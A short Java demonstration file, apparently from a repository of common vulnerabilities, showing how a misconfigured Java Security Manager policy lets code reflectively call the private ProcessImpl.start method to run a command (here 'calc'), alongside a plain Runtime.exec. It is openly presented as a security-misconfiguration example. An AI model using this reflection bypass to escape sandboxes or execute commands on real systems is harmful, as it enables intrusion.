package com.r17a.commonvuln.securitymissconfig.securitymanager;

import java.lang.reflect.Method;
import java.util.Map;

public class BypassByReflection {
    public static void main(String[] args) {

        //TODO compile and run with: -Djava.security.manager -Djava.security.policy==bypass-by-reflection.policy
        // bypass-by-reflection.policy:
        // grant {
        //    permission java.lang.reflect.ReflectPermission "suppressAccessChecks";
        //    permission java.lang.RuntimePermission "accessDeclaredMembers";
        // };

//        executeCommandWithReflection("calc");
        exec("calc");
    }

    public static void exec(String command) {
        try {
            Runtime.getRuntime().exec(command);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void executeCommandWithReflection(String command) {
        try {
            Class clz = Class.forName("java.lang.ProcessImpl");
            Method method = clz.getDeclaredMethod("start", String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class);
            method.setAccessible(true);
            method.invoke(clz, new String[]{command}, null, null, null, false);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}